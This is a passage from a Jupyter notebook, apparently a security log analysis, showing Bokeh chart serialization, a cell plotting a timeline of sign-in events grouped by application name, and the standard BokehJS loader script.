:{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2853\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2863\",\"attributes\":{\"data_source\":{\"id\":\"p2617\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2864\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2865\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2860\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2861\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2862\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2872\",\"attributes\":{\"data_source\":{\"id\":\"p2620\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2873\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2874\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2869\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2870\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2871\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p2751\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"RangeTool\",\"id\":\"p2875\",\"attributes\":{\"x_range\":{\"id\":\"p2668\"},\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2880\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":0.5,\"line_dash\":[2,2],\"fill_color\":\"navy\",\"fill_alpha\":0.2,\"level\":\"overlay\",\"propagate_hover\":true,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2876\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"left\"}},\"right_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2877\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"right\"}},\"top_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2878\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"top\"}},\"bottom_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2879\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"bottom\"}},\"editable\":true,\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2886\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2885\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}}]}},\"toolbar_location\":null,\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2755\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2756\",\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2757\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2758\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2759\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2760\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2761\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2762\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2763\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2764\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2765\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2766\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2767\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2768\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2775\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2772\"}}},{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2774\",\"attributes\":{\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\",\"align\":\"right\"}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2773\",\"attributes\":{\"axis\":{\"id\":\"p2755\"}}}]}}]}}]}};\n  const render_items = [{\"docid\":\"3ad8e9cd-62fe-4fd2-afa6-d479543012d9\",\"roots\":{\"p2999\":\"d173dd14-f302-42c0-b138-47327612cfc5\"},\"root_ids\":[\"p2999\"]}];\n  void root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "p2999"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.models.layouts.Column\">Column</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'p2999', <span id=\"p3034\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'auto',</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">children&nbsp;=&nbsp;[figure(id='p2658', ...), figure(id='p2742', ...)],</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">context_menu&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_variables&nbsp;=&nbsp;{},</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">elements&nbsp;=&nbsp;[],</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">flow_mode&nbsp;=&nbsp;'block',</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_attributes&nbsp;=&nbsp;{},</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_id&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">resizable&nbsp;=&nbsp;False,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">spacing&nbsp;=&nbsp;0,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">styles&nbsp;=&nbsp;{},</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">stylesheets&nbsp;=&nbsp;[],</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;PropertyValueSet(),</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">syncable&nbsp;=&nbsp;True,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"p3033\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto')</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  let expanded = false;\n",
       "  const ellipsis = document.getElementById(\"p3034\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    const rows = document.getElementsByClassName(\"p3033\");\n",
       "    for (let i = 0; i < rows.length; i++) {\n",
       "      const el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Column(id='p2999', ...)"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logons_df.mp_plot.timeline(\n",
    "    group_by=\"AppDisplayName\",\n",
    "    source_columns = disp_cols\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "3607ca88",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "    <style>\n",
       "        .bk-notebook-logo {\n",
       "            display: block;\n",
       "            width: 20px;\n",
       "            height: 20px;\n",
       "            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAOkSURBVDiNjZRtaJVlGMd/1/08zzln5zjP1LWcU9N0NkN8m2CYjpgQYQXqSs0I84OLIC0hkEKoPtiH3gmKoiJDU7QpLgoLjLIQCpEsNJ1vqUOdO7ppbuec5+V+rj4ctwzd8IIbbi6u+8f1539dt3A78eXC7QizUF7gyV1fD1Yqg4JWz84yffhm0qkFqBogB9rM8tZdtwVsPUhWhGcFJngGeWrPzHm5oaMmkfEg1usvLFyc8jLRqDOMru7AyC8saQr7GG7f5fvDeH7Ej8CM66nIF+8yngt6HWaKh7k49Soy9nXurCi1o3qUbS3zWfrYeQDTB/Qj6kX6Ybhw4B+bOYoLKCC9H3Nu/leUTZ1JdRWkkn2ldcCamzrcf47KKXdAJllSlxAOkRgyHsGC/zRday5Qld9DyoM4/q/rUoy/CXh3jzOu3bHUVZeU+DEn8FInkPBFlu3+nW3Nw0mk6vCDiWg8CeJaxEwuHS3+z5RgY+YBR6V1Z1nxSOfoaPa4LASWxxdNp+VWTk7+4vzaou8v8PN+xo+KY2xsw6une2frhw05CTYOmQvsEhjhWjn0bmXPjpE1+kplmmkP3suftwTubK9Vq22qKmrBhpY4jvd5afdRA3wGjFAgcnTK2s4hY0/GPNIb0nErGMCRxWOOX64Z8RAC4oCXdklmEvcL8o0BfkNK4lUg9HTl+oPlQxdNo3Mg4Nv175e/1LDGzZen30MEjRUtmXSfiTVu1kK8W4txyV6BMKlbgk3lMwYCiusNy9fVfvvwMxv8Ynl6vxoByANLTWplvuj/nF9m2+PDtt1eiHPBr1oIfhCChQMBw6Aw0UulqTKZdfVvfG7VcfIqLG9bcldL/+pdWTLxLUy8Qq38heUIjh4XlzZxzQm19lLFlr8vdQ97rjZVOLf8nclzckbcD4wxXMidpX30sFd37Fv/GtwwhzhxGVAprjbg0gCAEeIgwCZyTV2Z1REEW8O4py0wsjeloKoMr6iCY6dP92H6Vw/oTyICIthibxjm/DfN9lVz8IqtqKYLUXfoKVMVQVVJOElGjrnnUt9T9wbgp8AyYKaGlqingHZU/uG2NTZSVqwHQTWkx9hxjkpWDaCg6Ckj5qebgBVbT3V3NNXMSiWSDdGV3hrtzla7J+duwPOToIg42ChPQOQjspnSlp1V+Gjdged7+8UN5CRAV7a5EdFNwCjEaBR27b3W890TE7g24NAP/mMDXRWrGoFPQI9ls/MWO2dWFAar/xcOIImbbpA3zgAAAABJRU5ErkJggg==);\n",
       "        }\n",
       "    </style>\n",
       "    <div>\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-notebook-logo\"></a>\n",
       "        <span id=\"fbaf098b-5e8f-4f45-b12c-0dffd7d956f0\">Loading BokehJS ...</span>\n",
       "    </div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "'use strict';\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\nconst JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    function drop(id) {\n      const view = Bokeh.index.get_by_id(id)\n      if (view != null) {\n        view.model.document.clear()\n        Bokeh.index.delete(view)\n      }\n    }\n\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = cell.output_area._bokeh_server_id;\n\n    // Clean up Bokeh references\n    if (id != null) {\n      drop(id)\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim()\n            drop(id)\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded(error = null) {\n    const el = document.getElementById(\"fbaf098b-5e8f-4f45-b12c-0dffd7d956f0\");\n    if (el != null) {\n      const html = (() => {\n        if (typeof root.Bokeh === \"undefined\") {\n          if (error == null) {\n            return \"BokehJS is loading ...\";\n          } else {\n            return \"BokehJS failed to load.\";\n          }\n        } else {\n          const prefix = `BokehJS ${root.Bokeh.version}`;\n          if (error == null) {\n            return `${prefix} successfully loaded.`;\n          } else {\n            return `${prefix} <b>encountered errors</b> while loading and may not function as expected.`;\n          }\n        }\n      })();\n      el.innerHTML = html;\n\n      if (error != null) {\n        const wrapper = document.createElement(\"div\");\n        wrapper.style.overflow = \"auto\";\n        wrapper.style.height = \"5em\";\n        wrapper.style.resize = \"vertical\";\n        const content = document.createElement(\"div\");\n        content.style.fontFamily = \"monospace\";\n        content.style.whiteSpace = \"pre-wrap\";\n        content.style.backgroundColor = \"rgb(255, 221, 221)\";\n        content.textContent = error.stack ?? error.toString();\n        wrapper.append(content);\n        el.append(wrapper);\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(() => display_loaded(error), 100);\n    }\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-3.7.3.min.js\"];\n  const css_urls = [];\n\n  const inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {\n    }\n  ];\n\n  function run_inline_js() {\n    if (root.Bokeh !== undefined || force === true) {\n      try {\n            for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n\n      } catch (error) {display_loaded(error);throw error;\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"fbaf098b-5e8f-4f45-b12c-0dffd7d956f0\")).parents('.cell').data().cell;\n      